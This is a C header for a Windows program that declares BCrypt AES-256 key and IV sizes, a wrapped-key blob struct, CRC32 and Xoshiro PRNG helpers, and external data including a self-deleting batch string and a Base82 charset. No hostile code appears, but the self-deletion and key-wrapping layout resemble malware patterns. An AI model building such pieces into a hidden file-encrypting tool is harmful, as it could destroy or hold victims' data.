#pragma once
/* Compiler / Headers */
#pragma comment(linker, "\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#pragma warning(disable : 4214)
#include "config.h"

HANDLE g_hPH;

/* Console */
#define CON_SUCCESS FOREGROUND_GREEN                                             // 0b0010
#define CON_INFO    ((FOREGROUND_RED | FOREGROUND_GREEN) | FOREGROUND_BLUE)      // 0b0111
#define CON_WARNING ((FOREGROUND_RED | FOREGROUND_GREEN) | FOREGROUND_INTENSITY) // 0b1101
#define CON_ERROR   (FOREGROUND_RED  | FOREGROUND_INTENSITY)                     // 0b1100

/* BCrypt */
#define AES_KEY_SIZE 0x20                                                   // 256-Bits
#define AES_IV_SIZE 0x10                                                    // 128-Bits
#define WRAP_BLOB_SIZE (sizeof(BCRYPT_KEY_DATA_BLOB_HEADER) + AES_KEY_SIZE) // 44-Bytes (Dynamic)
#define GENERIC_RW (GENERIC_READ | GENERIC_WRITE)

typedef struct {
	BYTE  KEY[(sizeof(BCRYPT_KEY_DATA_BLOB_HEADER) - 4) + 32];
	BYTE  IV[16];
	DWORD CRC;
} AESBLOB, * PAESBLOB;

/* CRC32 Hash-Algorithm : CRC32.c */
DWORD fnCRC32(_In_ PBYTE pBuffer, _In_ SIZE_T nBufferLen);
VOID fnAllocTable();
VOID fnFreeTable();

/* Xoshiro PRNG Algorithm : Xoshiro.c */
typedef struct {
#if _DISABLE_JUMPS == 0
	DWORD ran : 3;
	DWORD lj : 8;
	DWORD sj : 8;
	DWORD ns : 13;
#else
	WORD ran : 3;
	WORD ns : 13;
#endif
} XSR, * PXSR;

/* Data : Data.c*/
extern const WCHAR szSelfDelBat[];
extern const WCHAR szCharSetBASE82[];